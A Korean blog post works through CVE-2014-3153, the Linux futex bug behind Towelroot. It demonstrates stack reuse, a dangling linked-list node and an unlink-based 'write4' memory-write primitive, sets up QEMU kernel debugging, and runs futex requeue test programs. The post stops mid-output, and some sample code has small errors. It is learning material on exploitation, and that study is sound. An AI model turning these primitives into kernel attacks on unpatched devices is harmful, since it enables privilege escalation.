---
layout: post
title: "The Futex Bug"
date: 2014-11-19 15:15:57 +0900
comments: true
categories: 
---

Towelroot 의 근간이 되는 취약점. CVE-2014-3153.

다음 문서를 보고 이해해보려한다. 아주 잘씌여진 문서. 두명의 저자에게 감사.

* [Tinyhack.com 의 설명](http://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/)
* [The Futex Vulnerability](http://blog.nativeflow.com/the-futex-vulnerability)

GeoHot 이 만든 Towelroot 소스.

* [Toweelroot](http://pastebin.com/A0PzPKnM)

## The Stack

Tinyhack.com 의 예제를 컴파일해서 돌려본다. 스택 레이아웃이 같은 함수라서 생기는 현상.

``` c babo.c
#include <stdio.h>

int foo(int init,int v)
{
    int local;
    if (init) local = v; else printf("local foo is %d\n",local);
}
int bar(int init,int v)
{
    int local;
    if (init) local = v; else printf("local bar is %d\n",local);
}
main()
{
    foo(1,10);
    foo(0,0);
    bar(1,999);
    foo(0,0);
}
```

    ~% gcc babo.c -o babo
    ~% ./babo
    local foo is 10
    local foo is 999

`foo()` 에 들어가서 잡히는 스택쪽 local variable 영역이 `bar()` 에서 overwrite(?) 되었다. overwrite 라고 말하기도 뭐한게, stack variable 이라 uninitialized 되어서 그런것.

## Linked-list 

Tinyhack.com 에 나와있는 예제를 돌려본다.

```
z@z-linux:~/hack$  gcc -m32 simple.c -o simple
z@z-linux:~/hack$ ./simple
we will use pos: -1
Not a buggy function
Value = Alpha
Value = Beta
Value = --END OF LIST--
a buggy function, here is the location of value on stack 0xff873d14
Value = Alpha
Value = Beta
Value = --END OF LIST--
location of buf[0] is 0xff873cf8
location of buf[1] is 0xff873cfc
location of buf[2] is 0xff873d00
location of buf[3] is 0xff873d04
location of buf[4] is 0xff873d08
location of buf[5] is 0xff873d0c
location of buf[6] is 0xff873d10
location of buf[7] is 0xff873d14
location of buf[8] is 0xff873d18
location of buf[9] is 0xff873d1c
Value = Alpha
Value = Beta
Value = --END OF LIST--
z@z-linux:~/hack$ 
z@z-linux:~/hack$ 
z@z-linux:~/hack$ 
z@z-linux:~/hack$ ./simple 7 babo
we will use pos: 7
Not a buggy function
Value = Alpha
Value = Beta
Value = --END OF LIST--
a buggy function, here is the location of value on stack 0xff9892e4
Value = Alpha
Value = Beta
Value = --END OF LIST--
Value = Alpha
Value = Beta
Value = babo <- !!!
z@z-linux:~/hack$ 
```

Compile 해보고 돌려보니, `Value` 가 `babo` 로 바뀌었다. 흥미롭다. 
value 뿐만 아니라, `next`, `prev` 도 스택에 있으니, list 의 link 들이 바뀔 수 있는 상황이 벌어질 수 있다.

정리하면,

* Linked-list 에 stack 에 위치한 node 를 add 했다가, remove 를 안하고 return 해버리면, 
* Linked-list 의 tail 이 공중에 붕 뜬 stack 을 pointing 하게 된채로 남아있게 된다. 
* 고만고만한 레벨의 함수들을 오가다보면 어쩌다가 스택프레임이 비슷하게 잡히면서, 그 stack address 와 같은 곳에 위치한 local 변수가 생기게 마련. 
* 전혀 다른 함수에서 local 변수를 바꿨는데, linked-list 의 tail node 의 내용이 바뀌게 된다.
* 이제 linked-list 의 마지막 노드의 `value` 가 갈아쳐져버리는 사태가 발생.
* 문제는 `value` 뿐만 아니라, `next`, `prev` 포인터도 바뀔 수 있다는 것.

그러면 node 스트럭쳐를 보자.

``` c
struct node {
    const char *value;
    struct node *next;
    struct node *prev;
};
```

Linked-list 의 link 를 manipulation 할 수 있다면?

### Writing using list primitives

Link pointer 까지도 manipulation 할 수 있다면, Heap overflow 의 unlink 와 같은 상황이 벌어질수도 있다.

Tinyhack.com 에 나온 unlink() 예제.

``` c
void node_remove(struct node *n)
{
    struct node *prevnode = n->prev;
    struct node *nextnode = n->next;
    nextnode->prev = prevnode;
    prevnode->next = nextnode;
}
```

위와같은 node unlink() 함수를 이용해서 memory 에 4 byte 를 write 하는 primitive 인, write4() 를 구현할 수 있다.

``` c write4()
//
// write primitive
// assumes x86_32
// equivalent to 
// *((struct node*)((p-8)+8)) = val;
// *((struct node*)(val+4)) = (p-8);
//
void write4(char *p, char *val)
{
    // assume x86_32
    // offset to next: 4
    // offset to prev: 8 
    struct node n;

    n.next = (p-8);
    n.prev = val;

    node_remove(&n);
}
```

이런 예제를 만들어 돌려봤더니, `char buf[512]` 에 0x30303030 (or 0x0000000030303030) 이 들어가는 것을 확인할 수 있었다. 물론 side-effect 로 죽어버렸다.

``` c
int unlink(ListElement *element)
{
    ListElement *next = element->next;
    ListElement *prev = element->prev;
    next->prev = prev;
    prev->next = next;
    return 0;
}
struct _ListElement {
    ListElement *prev;
    ListElement *next;
};
typedef struct _ListElement ListElement;
void main()
{
    char buf[512];
    ListElement a;
    a->prev = (ListElement*)0x30303030;
    a->next = buf;
    unlink(&a);
}
```

커널에 이런 오퍼레이션이 있다면 커널 메모리 write 가 가능할 수도 있다는게 이 버그의 실마리인 것 같다는 생각이 들었다.

참고가 될만한 글들.

* [Vudo Malloc Tricks](http://phrack.org/issues/57/8.html)
* [Once upon a free](http://phrack.org/issues/57/9.html)
* [Advanced Doug lea's malloc exploits](http://phrack.org/issues/61/6.html)
* [Malloc Des-Maleficarum](http://phrack.org/issues/66/10.html)

Tinyhack.com 의 주인장 Yohanes Nugroho 는 `dangling node on the stack` 문제와 `memory write abusing linked-list operation` 이 futex 버그의 핵심이라고 이야기한다.

[oss-sec 의 메일링 리스트에서](http://seclists.org/oss-sec/2014/q2/469)

    From: Kees Cook <kees () ubuntu com>
    Date: Thu, 5 Jun 2014 08:49:50 -0700

    ...
    Specifically, the futex syscall can leave a queued kernel waiter hanging
    on the stack. By manipulating the stack with further syscalls, the waiter
    structure can be altered. When later woken up, the altered waiter can
    result in arbitrary code execution in ring 0.
    ...

메일을 읽어보니 대략 감은,

1. Stack 에 futex waiter node 를 dangling 하게 걸어놓는다. 발생하기 어려운 상황일테니 뭔가 기묘한 수를 썼겠지.
2. 시스템콜을 써서 어떻게든 저 스택 어드레스에 위치한 link pointer 에 원하는 address 를 박아 넣는다.
3. 나중에 wake 하면서 lock 을 가져가고 running 하게 되고, 저 node 가 waiter list 에서 unlink 되던지 하면서 원하는 address 에 원하는 값이 써진다.

이 정도가 아닐까? 계속 읽어봐야겠다.

처음 발단은 Dave Jones 의 trinity syscall fuzzer 에서 나왔다고 하는데, 아마 이 메일인 듯.

* [3.15-rc3 rtmutex-debug assertion.](http://marc.info/?l=linux-kernel&m=139878466226906)

## Futex

Futex 에 관한 글들.

* [Fuxx, Futexes and Furwocks: Fast User Level Locking in Linux](https://www.kernel.org/doc/ols/2002/ols2002-pages-479-495.pdf)
* [Futexes Are Tricky](http://www.akkadia.org/drepper/futex.pdf)
* [Requeue-PI: Making Glibc Condvars PI-Aware](http://lwn.net/images/conf/rtlws11/papers/proc/p10.pdf)
* [Futex Cheat Sheet](http://locklessinc.com/articles/futex_cheat_sheet)

### [Hubertus Franke & Rusty Russel 이 쓴 Fuxx, Futexes and Furwocks: Fast User Level Locking in Linux](https://www.kernel.org/doc/ols/2002/ols2002-pages-479-495.pdf)

요약해본다.

* 2.5 초반 버전부터 Linux kernel 에 들어간 light-weight 한 씽크 방식.
* 기존의 semaphore, msgqueue, socket, flock 등의 System V IPC 의 경우, kernel object 에 대한 handle 을 user space 로 노출시켜서, shared state / atomic operation 을 만들어냈지만, system call 을 계속 써야하기 때문에, Linux 라는 관점에서 빠른 user level lock 을 개발하게 되었다는 설명.
* Linux kernel 2.5.7 에 들어간 커널 코드와 유저 레벨 라이브러리로 이루어진다.
* 메인라인에는 2.6.x 에 들어갔다.

Locking 의 일반적인 문제점들을 소개한다. ([Congestion, Convoy Effect, and Thundering Herd](http://adrianotto.com/2011/01/convoy-effect/) 에 잘 정리되어있다)

#### Convoy problem

Sprodically scattered job 들이 공통으로 필요한 shared resource 에 대한 lock 을 걸다가, 지들끼리 synchronized 되버리면서 '떼'로 몰려다니게 되어서 그 뒤부터는 몰려다니며 wreak havoc 을 일으키는 문제. 뭔가 잘해보자고 lock 을 걸었다가 아예 같이 움직이면서 리소스를 같이 요구해대는 떼가 되버린다... 정도?

HTTP 서버를 예로 들면, 끊임없이 HTTP request 가 오는데, DB request 에 lock 이 걸려있다고 가정해보자. Lock 요청 순서대로 grant 해준다고 가정하면, 처음에는 멀쩡하게 잘 돌아가다가, 엄청나게 느린 녀석 (i.e. 복잡한 SQL 쿼리를 해야한다던지, network latency 가 커서 뭘해도 느린 녀석) 이 와버렸다.
이제부터는 더 빠르게 serve 될 수 있는 녀석들도 저 녀석 뒤로 줄을 서야 한다. 저녀석이 엄청나게 오래걸리는 SQL 쿼리를 하는 동안 착착 쌓여있다가, 저 녀석이 lock 을 풀고 먼저 나가서 다른 리소스에 lock 을 걸고 또 시간을 죽인다. 빨리 serve 될 수 있는 녀석들은 우두두 lock 을 풀고 나가서 또 저 진상 request 뒤에 줄을 서야한다. 본의아니게 이렇게 떼로 몰려다니게 된다.
그러면서 수행 속도는 가장 느린 녀석한테 맞춰지게 된다.

#### Thundering herd probelm

공평하게 해보자고, 기다리던 녀석들 다 깨워서, 서로 싸워서 이긴놈이 우리편으로 정책을 정했을때 일어나는 문제.

Lock 이 풀리기를 기다리던 수많은 프로세스들이, lock 이 풀리면 한꺼번에 일어나서,  wakeup -> sleep -> wakeup -> sleep 을 반복하게 되는데, 결과적으로는 1 개의 프로세스한테 cpu tick 과 리소스 점유권을 주고, 대신 (n-1) 개의 프로세스들한테는 wakeup->put to sleep 을 시키게되는데, process 를 wakeup 시키는데 비용이 들기 때문에 그 비용을 비교해보면, 후자는 명백히 낭비.

User level lock 을 만드는데, 두가지 케이스를 구별하여 구현하는데,

* Uncontended case: 요청에 비해 리소스가 충분한 상황. 가져가면 된다. system call 을 회피하기 위해서, user level 에 shared memory 를 만든다. mmap() 으로 만든다. System V IPC 에서 kernel operation 에 의존하는 것과 대비됨.
* Contended case: 리소스가 부족하다. 어쩔 수 없이 system call 을 써서, kernel 보고 block 을 시킬건지 말건지 결정하라고 한다.

실제로 futex 를 쓰려면 glibc 에 wrapper 함수가 없어서 상당히 빡쎈데.
Futex 예제 [futex-*.tar.bz2](ftp://ftp.kernel.org/pub/linux/kernel/people/rusty) 를 보고 사용법을 알아봤다.

1. mmap() 으로 shared file mapping 를 만들고, 
2. mprotect() 로 PROTO_READ|PROTO_WRITE|PROT_SEM 으로 만들고,
3. assembly 로 atomic_inc()/atomic_dec()/cmpxchg() 등을 구현해야한다. mmap() 으로 잡은 메모리에 대해서 atomic 한 instruction 으로 count 를 up/down 하다가 
4. 더이상 user level 에서 감당이 안되면(i.e. semaphore count == 0), system call futex() 를 불러서 kernel 한테 맡겨버린다. 프로세스간에 arbitration 이 필요한 상황. 더이상 유저레벨에서 shared memory 가지고 어떻게 할 상황이 아니다.

4 번에서 kernel 에 맡길때, 일반적인 semaphore 처럼 kernel handle 이나 object 를 
만들어서 넘기는 것이 아니다. 이 점이 골때린데, mmap() 으로 잡은 address 를 lock identity 로 넘겨버린다.

### [Ulrich Drepper 의 Futexes Are Tricky](http://www.akkadia.org/drepper/futex.pdf)

* "Fuss, Futexes and Furwocks: Fast User Level Locking in Linux" 가 outdate 된 내용들이 있다는 것.
* Rusty Russel 의 user level 코드도 잘못된 부분이 있다는 것. (2.x 대에도 있는지는 모르겠다)

### pthread

Linux 의 pthread 가 futex 로 구현되어있다. futex 의 api 수준은 pthread 을 위한 primitive 수준이라고 말하는게 적절할 것 같다. primitive 수준.

Stackoverflow 에서 괜찮은 질문을 찾았다. [Why is a pthread mutex considered “slower” than a futex?](http://stackoverflow.com/questions/6364314/why-is-a-pthread-mutex-considered-slower-than-a-futex)

#### pthread_cond_wait

pthread_cond_wait() 의 use case 는 consumer 에서 mutex 를 acquire 하고 resource 를 체크해보니, available 하지가 않아, 블락될테니까 available 해지면 깨워줘. 정도로 정리하기로 했다.

Linux man 페이지에서.

These functions atomically release `mutex` and cause the calling thread to block on the condition variable `cond`; atomically here means "atomically with respect to access by another thread to the mutex and then the condition variable". That is, if another thread is able to acquire the mutex after the about-to-block thread has released it, then a subsequent call to `pthread_cond_broadcast()` or `pthread_cond_signal()` in that thread shall behave as if it were issued after the about-to-block thread has blocked.

* atomic 하다는 의미는 pthread_cond_wait() 를 수행하면서, mutex 를 릴리즈하고 wait 으로 들어가기 직전, i.e. producer 가 mutex 를 acquire 하고 1 unit 을 produce 하고 pthread_cond_signal() 을 쐈을 경우, consumer 가 block 된 이후에 쏜 것으로 쳐준다는 것.

* block 되었다가 깨어날경우, 다른 쓰레드가 condition signaling -> wakeup -> mutex acquisition 으로 가는데 그 사이에 또 다른 쓰레드가 resource 를 훔쳐갈 가능성이 있다.

* 이 경우, mutex 는 acquire 했는데, resource 는 없는 상황으로 초기 상황과 동일하다. 다시 block 에 들어가야한다.

## On to the Kernel

이제 커널로 이동한다.

``` c futex_wait_requeue_pi() http://lxr.free-electrons.com/source/kernel/futex.c?v=3.4#L2263
static int futex_wait_requeue_pi(u32 __user *uaddr, 
                                    unsigned int falgs,
                                    u32 val,
                                    ktime_t *abs_time,
                                    u32 bitset,
                                    u32 __user *uaddr2)
{
    struct hrtimer_sleeper timeout, *to = NULL;
    struct rt_mutex_waiter rt_waiter;
    struct futex_hash_bucket *hb;
    union futex_key key2 = FUTEX_KEY_INIT;
    struct futex_q q = futex_q_init;
    int res, ret;

    // ...

    q.rt_waiter = &rt_waiter;

    //...

    /* Queue the futex_q, drop the hb lock, wait for wakeup. */
    futex_wait_queue_me(hb, &q, to);

    /*
     * In order for us to be here, we know our q.key == key2, and since
     * we took the hb->lock above, we also know that futex_reque() has
     * completed and we no longer have to concern ourselves with a wakeup
     * race with the atomic proxy lock acquisition by the requeue code. The
     * futex_requeue dropped our key1 reference and incremented our key2
     * reference count.
     */

    /* Check if the requeue code acquired the second futex for us. */
    if (!q.rt_waiter) {

    //...
```

stack 에 alloc 된 rt_waiter 라는 구조체를 queue 에 집어넣는 듯하다. 여기서 문제가 발생하는 모양.

이제 디버깅을 하기 위해서 QEMU 에 android kernel 을 빌드해서 올리자.

### QEMU

다음 문서들을 참조해서 커널을 빌드했다. 

* [Building Kernels](https://source.android.com/source/building-kernels.html)
* [How to compile android goldfish 3.4 kernel and run on emulator](http://stackoverflow.com/questions/21274910/how-to-compile-android-goldfish-3-4-kernel-and-run-on-emulator)

Emulator 로 돌릴거니까, goldfish 로 진행.

* `git checkout -t origin/android-goldfish-3.4 -b goldfish3.4`
* `git log futex.c` 로 commit log 를 뒤진다. Fix 는 두개 들어갔는데, `248523b64c19dec8c05f1a4105a5fd529e516fbe` & `52ecbbcb920fa3d529833b1d8ad97d4575c36bd9` 이고 수정 바로 전 commit 은 `e8c92d268b8b8feb550ca8d24a92c1c98ed65ace` 이다.
* `git checkout e8c92d268b8b8feb550ca8d24a92c1c98ed65ace kernel/futex.c`
* .config 에서 `CONFIG_DEBUG_INFO=y`

에뮬레이터로 빌드된 커널을 띄워본다.

``` sh
$ emulator-arm -verbose -debug init -show-kernel -kernel arch/arm/boot/zImage -avd debug -no-boot-anim -no-skin -no-audio -no-window -qemu -gdb tcp::1234 &
$ arm-eabi-gdb vmlinux
(gdb) target remote :1234
```

arm 용 gdb 를 돌려서 에뮬레이터에 붙였다. 테스트삼아 do_execve() 에 브레이크를 걸어본다.

``` sh
(gdb) break do_execve
Breakpoint 2 at 0xc00bc3a8: file fs/exec.c, line 1623.
(gdb) cont
```

그리고 다른 한쪽에서 `adb shell` 을 들어가본다. 그러면 break 가 잡힌다.

    Breakpoint 2, do_execve (filename=0xde09b000 "/system/bin/sh", __argv=0xbee346f8, __envp=0xbee34bac, regs=0xd40e5fb0) at fs/exec.c:1623
    (gdb)

이제 안드로이드 커널 디버깅 준비가 끝났다.

커널부터 이 문서들을 주로 참조하였다.

* [The Futex Vulnerability, Dany Zatuchna](http://blog.nativeflow.com/the-futex-vulnerability)
* [solidwrench blog - playing with futex_requeue bug](http://getpocket.com/a/read/770497804)
* [Detailed analysis and utilization cve2014-3153 loopholes](http://hj-h.com/514.html)

### Futex symantics

`op` 인자에 따라서 동작이 달려지며, 
glibc wrapper 가 없어서 `syscall(SYS_futex, ...)` 로 호출해야한다.

futex 시스템콜 구현.

``` c kernel/futex.c
/* 
 * int futex(int *uaddr, int op, int val, const struct timespec *timeout, int *uaddr2, int val3);
 */

SYSCALL_DEFINE6(futex, u32 __user *, uaddr, int, op, u32, val, 
                struct timespec __user *, utime, u32 __user *, uaddr2,
                u32, val3)
{
    struct timespec ts;
    ktime_t t, *tp = NULL;
    u32 val2 = 0;
    int cmd = op & FUTEX_CMD_MASK;

    if (utime && (cmd == FUTEX_WAIT || cmd == FUTEX_LOCK_PI ||
                    cmd == FUTEX_WAIT_BITSET ||
                    cmd == FUTEX_WAIT_REQUEUE_PI)) {
        if (copy_from_user(&ts, utime, sizeof(ts)) != 0)
            return -EFAULT;
        if (!timespec_valid(&ts))
            return -EINVAL;
        t = timespec_to_ktime(ts);
        if (cmd == FUTEX_WAIT)
            t = ktime_add_safe(ktime_get(), t);
        tp = &t;
    }
    /* 
     * requeue parameter in 'utime' if cmd == FUTEX_*_REQUEUE_*.
     * number of waiters to wake in 'utime' if cmd == FUTEX_WAKE_OP.
     */
    if (cmd == FUTEX_REQUEUE || cmd == FUTEX_CMP_REQUEUE ||
        cmd == FUTEX_CMP_REQUEUE_PI || cmd == FUTEX_WAKE_OP)
        val2 = (u32) (unsigned long) utime;

    return do_futex(uaddr, op, val, tp, uaddr2, val2, val3);
}
```

대략적인 call path 는

1. User level 에서 syscall 호출해서 futex(uaddr, op, val, timeout, uaddr2, val3) 이 불림.

2. futex() 는 do_futex(uaddr, op, val, tp, uaddr2, val2, val3) 을 호출.

3. do_futex() 는 op-code 에 따라서 futex_wake(), futex_requeue(), futex_wake_op(), futex_lock_pi(), futex_unlock_pi(), futex_wait_requeue_pi() 등을 호출한다.

#### FUTEX_WAIT 

calling 하는 thread 가 wait-queue 에 들어가고, sleep 한다. 
데드락을 방지하기 위해서, sleep 들어가기전에 자신이 원하는 condition 인지 확인해야한다. 
i.e. resource 가 unavaileable 할 경우 wait 하겠다는 것인데, resource 가 있는데 sleep 에 들어가면, resource producer 가 생산시에 보내는 signal 이 앞으로 없을 수 있다.

`uaddr`, `val`, `timeout` 을 사용한다.

#### FUTEX_WAKE

FUTEX_WAIT 의 반대 함수. wait-queue 에서 sleep 하고 있는 thread(s) 를 깨운다.

'uaddr' 에 futex 를, `val` 에 깨울 thread 수를 지정한다.

futex 에 친숙해지기 위해, futex 의 FUTEX_WAIT 와 FUTEX_WAKE 를 사용하여 간단한 thread 샘플을 돌려보았다. 쓰레드 하나를 재우고, 몇초뒤에 wakeup 시키는 간단한 테스트 프로그램이었다.

``` c futex_wait_wake
#ifndef SYS_futex
#define SYS_futex __NR_futex
#endif
int futex_wait(int *uaddr, int val)
{
    return syscall(SYS_futex, uaddr, FUTEX_WAIT, val, NULL, NULL, 0);
}
int futex_wake(int *uaddr, int val)
{
    return syscall(SYS_futex, uaddr, FUTEX_WAKE, val, NULL, NULL, 0);
}
static void * thread_proc(void *arg)
{
    void *map=arg;
    printf("thread: calling futex_wait()...\n");
    futex_wait((int*)map,0);
    printf("thread: woke up\n");
    return NULL;
}
int main(int ac,char **av)
{
    void *map;
    int fd;
    pthread_t t1;

    /* page may be used for atomic ops */
    map = mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_SEM,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if (map == MAP_FAILED) {perror("mmap");exit(1);}
    pthread_create(&t1,NULL,thread_proc,map);
    sleep(5);
    printf("calling futex_wake()...\n");
    futex_wake((int*)map,1);
    sleep(5);
    return 0;
}
```

QEMU 에 올려서 돌려보았다.

``` sh
z@z-linux:~/hack/futex/jni$ adb push ../libs/armeabi/futex /data/local/tmp/futex
z@z-linux:~/hack/futex/jni$ adb shell
root@generic:/ # cd /data/local/tmp
root@generic:/data/local/tmp # ./futex 
thread: calling futex_wait()...
calling futex_wake()...
thread: woke up
root@generic:/data/local/tmp #
```

당연하게도 futex_wait() 와 futex_wake() 가 잘 동작했다.

#### FUTEX_REQUEUE

"Futex Cheat Sheet" 를 읽어보니.

Futex API 는 단순히 wait-queue 에 thread 를 add/remove 하는 api 만 지원하는것이 아니라고 한다. sleeping thread 가 서로 다른 2 개의 wait-queue 에 옮겨 다닐 수 있다고 하며, pthread 의 condition 을 구현하기 위한 중요한 primitive 라고 하는데. 흠.

pthread 의 condition 에 관한 usage 를 생각해보면.

1. mutex lock 에 대한 wait-queue 가 있고, condition variable 에 걸려서 시그널을 기다리는 wait-queue 가 있다하자.
2. condition variable 의 wait-queue 에서 시그널을 기다리며 잠자고 있다.
3. i.e. "broadcast" event 로 모든 threads 가 wakeup 한다.
4. 이제 mutex 를 acquire 해야 최후의 승자.
5. 다들 mutex lock 의 wait-queue 에 들어가 sleep 한다.
6. 한개빼고는 모든 threads 가 condition variable 의 wait-queue 에서 깨어나서, 다시 mutex lock 의 wait-queue 에 가서 sleep 하는 상황이 비효율적. 흠.
7. 이런 상황에서 FUTEX_REQUEUE op 가 도움이 될 수 있다.

`uaddr` 은 from-wait-queue. `uaddr2` 은 to-wait-queue. 
`val1` 은 wake 할 thread 수. 
`timeout` 은 transfer 할 thread 수.

만약 `timeout` 이 `0` 라면 FUTEX_WAKE 와 동일해진다. 1 이라면 thread 1 개만 옮기고, INT_MAX 라면 모든 thread 를 옮겨버린다. wake 하는 녀석. 옮겨지는 녀석. 남아 있는 녀석.

``` c FUTEX_REQUEUE
int futex_requeue(int *uaddr1,int *uaddr2,int wake,int transfer)
{
    return syscall(SYS_futex,uaddr1,FUTEX_REQUEUE,wake,transfer,uaddr2,0);
}
static void *thread_proc_1(void *arg)
{
    void *map = arg;
    printf("thread#1: sleep...\n");
    futex_wait((int*)map,0);
    printf("thread#1: woke up\n");
    return NULL;
}
static void *thread_proc_2(void *arg)
{
    void *map = arg;
    printf("thread#1: sleep...\n");
    futex_wait((int*)map,0);
    printf("thread#2: woke up\n");
    return NULL
}
int main(int ac,char **av)
{
    void *map;
    pthread_t t1,t2;
    map = mmap(NULL,4096,PROT_READ|PROT_WRITE|PROT_SEM,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if (map == MAP_FAILED) {perror("mmap");exit(1);}
    pthread_create(&t1,NULL,thread_proc_1,map);
    pthread_create(&t2,NULL,thread_proc_2,map);
    sleep(3);
    printf("requeuing one thread to uaddr2...\n");
    futex_requeue((int*)map,(int*)(map+8),1,1);
    sleep(3);
    printf("calling futex_wake() to uaddr2...\n");
    futex_wake((int*)(map+8),1);
    sleep(3);
    return 0;
}
```

실행해보았다.

``` sh
z@z-linux:~/hack/futex/libs/armeabi$ adb push mutex /data/local/tmp
173 KB/s (9496 bytes in 0.053s)
z@z-linux:~/hack/futex/libs/armeabi$ adb shell
root@generic:/ # cd /data/local/tmp
root@generic:/data/local/tmp # ./mutex
thread#2: sleep...
thread#1: sleep...
requeuing one thread to uaddr2...
thread#2: woke up
calling futex_wake() to uaddr2...
thread#1: woke up
root@generic:/data/local/tmp #
```

`FUTEX_REQUEUE` 로 thread#2 이 wakeup 하고 thread#1 이 uaddr2 의 wait-queue 로 이동했다. 나중에 uaddr2 의 wait-queue 에서 sleep 하고 있는 thread#1 을 wakeup 시킨다.

#### FUTEX_CMP_REQUEUE

실제로는 복잡한 일들이 있어서, glibc 에서 쓰기 위한 버전은 이거라고 한다.
race condition 을 확인하기 위한 버전. `uaddr` 이 pointing 하는 어드레스에 저장된 값이 `val3` 이어야만 requeuing 이 진행된다.

#### PI futexes

그렇다면 PI futex 는 무었일까. 

일단 정리하면 `Priority inversion` 문제를 해결하기 위한 syscall 들. lock 을 low priority thread 가 own 하고 있다. High priority thread 가 이 lock waiter queue 에 들어가있다. 기다리고 있는 것이다. 여기 Medium priority thread 가 끼어든다. High 는 wait 상태니 OS 스케쥴러가 low priority 의 cpu tick 을 뺐어다가 Medium 한테 준다. low 는 lock 을 해제할 기회를 얻지 못한다. High 는 medium 한테 치인다. High 가 medium 한테 치이는 상황은 문제가 있다.

The new priority inheritance multiplex functions are undocumented in the Futex man pages. However, they are described in pi-futex.txt and futex-requeue-pi.txt within the Linux Kernel documentation directory. These functions were created due to the problem of priority inversion with normal locks.

Imagine there is a high-priority thread. This thread wants to obtain a lock. However, that lock could be already owned by low-priority thread. If that low-priority thread is not run due to other medium-priority threads existing, then the high-priority thread is stuck.

The kernel is required to fix this because it is the final arbitrator of which threads execute. However, in order to do so, it needs to know who owns a lock in order to temporarily boost the priority of the low-priority thread. Thus these operations are tightly coupled to glibc with an inflexible ABI. For every lock operation required by glibc, a corresponding priority-inheritance version is required as a multiplex function.

The ABI expects that the integer pointed to by the addr1 parameter is either zero, which specifies that the priority inheritance lock is unlocked, or equal to the tid (Thread ID) of a thread which owns the lock, with perhaps a couple of upper bits set signifying the presence of waiters, or "robustness".

Thus the user-space locking operation should atomically try to alter the mutex from zero to the current tid via a cmpxchg operation. If this succeeds, then the thread has the lock, and no other work is required. The fact that the kernel doesn't need to be entered increases efficiency. However, if the lock is already held, the task will need to call the FUTEX_LOCK_PI multiplex function.

This function will return once the lock pointed to by addr1 is locked by the current thread. If a timeout is required, then the timeout argument can be used signifying an absolute timeout, otherwise a NULL value signifies that the thread should wait forever.

Once the thread returns from the kernel, it may have the top bit (FUTEX_WAITERS) set signifying that the lock is contended and other threads remain on the wait-queue. To unlock the priority inheritance lock, this bit can be atomically checked for via another cmpxchg. If it is unset, then all that needs to be done is to write zero, the unlocked value, into the lock. However, if there are waiters, then the FUTEX_UNLOCK_PI multiplex function should be called. It takes no other parameters other than addr1 specifying the lock to unlock.

In addition to locking and unlocking the priority inheritance mutex, pthreads also needs to implement the trylock function. This can be implemented like the lock function, mostly in userspace, and only calling into the kernel if there is contention. The FUTEX_TRYLOCK_PI multiplex function implements this operation.

Finally, there are two more priority inheritance operations used to implement condition variables. The first of these is FUTEX_CMP_REQUEUE_PI which is identical to FUTEX_CMP_REQUEUE other than requiring priority inheritance Futexes as the destination wait-queue. Note that priority-inheritance Futex to priority-inheritance Futex requeues are currently unsupported, so addr1 needs to point to a non-priority-inheritance Futex.

The last Futex multiplex function is FUTEX_WAIT_REQUEUE_PI. This is the inverse operation of FUTEX_CMP_REQUEUE. It puts the current thread to sleep on a Futex wait-queue, and then waits to be requeued onto a priority-inheritance Futex. addr1 is the non-priority-inheritance wait-queue to wait on, and addr2 is the priority-inheritance wait-queue we will be moved to when FUTEX_CMP_REQUEUE is called. Note that we must match the addr2 passed to that multiplex function. The only other argument to this operation is an absolute timeout. The bitset defaults to all bits set.

#### FUTEX_LOCK_PI

* "Priority inheritance" futexes are semantically different, but similar
* The user-space futex value is zero for unlocked, or holds the thread ID of the owner
* The `FUTEX_LOCK_PI` and `FUTEX_UNLOCK_PI` calls are used instead of wait and wake
* Unlocking a PI-futex wakes only the highest priority waiter

#### FUTEX_CMP_REQUEUE_PI

* Avoid "thundering herd" when moving from a non-PI futex to a PI-futex
* Waiters call FUTEX_WAIT_REQUEUE_PI to sleep
* Another thread calls FUTEX_CMP_REQUEUE_PI to "requeue" the waiters to the PI-futex
* If the PI-futex is unlocked, one of the threads will lock it and wake

futex 로 pthread_cond_wait() 을 흉내내봤다.

``` c
static int mtx=0
static int cond=0

inline int futex_lock_pi(int *uaddr)
{ return syscall(SYS_futex, uaddr, FUTEX_LOCK_PI, 1, NULL, NULL, 0); }

inline int futex_unlock_pi(int *uaddr)
{ return syscall(SYS_futex, uaddr, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0); }

inline int futex_wait_requeue_pi(int *uaddr1, int *uaddr2)
{ return syscall(SYS_futex, uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, NULL, uaddr2, 0); }

inline int futex_cmp_requeue_pi(int *uaddr1, int *uaddr2, int cmpval)
{ return syscall(SYS_futex, uaddr1, FUTEX_CMP_REQUEUE_PI, 1, NULL, uaddr2, cmpval); }

static void *thread_proc_1(void *arg)
{
    int ret;
    printf("thread#1: futex_wait_requeue_pi(&cond,&mtx)...\n");
    ret = futex_wait_requeue_pi(&cond,&mtx);
    printf("thread#1: resume execution, ret = %d\n", ret);
    printf("thread#1: return...\n");
    return NULL;
}
int main(int ac,char **av)
{
    int ret;
    pthread_t t1;
#define SLEEP() {printf(".\n");sleep(1);}

    printf("main: futex_lock_pi() mtx...\n");
    ret = futex_lock_pi(&mtx);
    printf("main: ret = %d\n", ret);
    printf("main: sleep...\n"); SLEEP(); SLEEP(); SLEEP(); SLEEP(); SLEEP();

    printf("main: pthread_create thread_proc_1...\n");
    pthread_create(&t1, NULL, thread_proc_1, NULL);
    printf("main: sleep...\n"); SLEEP(); SLEEP(); SLEEP(); SLEEP(); SLEEP();

    printf("main: futex_cmp_requeue_pi(&cond,&mtx,cond)...\n");
    ret = futex_cmp_requeue_pi(&cond,&mtx,cond);
    printf("main: ret = %d\n", ret);
    if (ret < 0) { printf("futex_cmp_requeue_pi failed\n"); exit(1); }
    printf("main: sleep...\n"); SLEEP(); SLEEP(); SLEEP(); SLEEP(); SLEEP();

    printf("main: futex_unlock_pi() mtx...\n");
    ret = futex_unlock_pi(&mtx);
    printf("main: ret = %d\n",ret);
    printf("main: sleep...\n"); SLEEP(); SLEEP(); SLEEP(); SLEEP(); SLEEP();

    return 0;
}
```

실행해보면, 
``` sh
root@generic:/data/local/tmp # ./requeue_pi
main: futex_lock_pi() mtx...
main: ret = 0
main: sleep...
.
.
.
.
.
main: pthread_create thread_proc_1...
main: sleep...
.
thread#1: futex_wait_requeue_pi(&cond,&mtx)...
.
.
.
.
main: futex_cmp_requeue_pi(&cond,&mtx,cond)...
main: ret = 1
main: sleep...
.
.
.
.
.
